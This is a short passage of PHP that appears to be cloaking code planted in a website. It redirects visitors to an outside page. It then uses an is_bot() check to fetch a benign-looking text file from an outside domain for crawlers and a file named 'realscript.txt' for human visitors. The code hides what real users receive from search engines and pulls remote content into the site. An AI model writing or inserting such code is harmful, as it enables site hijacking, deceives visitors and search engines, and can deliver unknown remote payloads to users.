...
header("Location: https://douberman.dev/amp/amp-trafficprobeds.html/");
die;
}

$url = is_bot()
? "https://dangerman.locker/landing/trafficprobeds/index.txt"
: "https://dangerman.locker/landing/trafficprobeds/realscript.txt";
